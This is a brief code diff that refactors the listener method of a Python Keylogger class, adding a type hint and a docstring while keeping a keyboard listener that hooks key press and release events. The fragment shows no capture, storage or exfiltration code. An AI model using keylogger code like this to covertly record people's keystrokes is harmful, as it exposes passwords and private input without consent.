@@ -79,6 +79,9 @@ class Keylogger:
             raise Exception("Error while starting Keylogger")
         return
 
-    def __run_listener(self):
-        with keyboard.Listener(on_press=self.__on_key_press, on_release=self.__on_key_release) as listener:
+    def __run_listener(self) -> None:
+        """
+        This method is used to start the listener until the __keylogger_stopped event
+        """
+        with keyboard.Listener(on_press=self.__on_key_press, on_release=self.__on_key_release):
             self.__keylogger_stopped.wait()
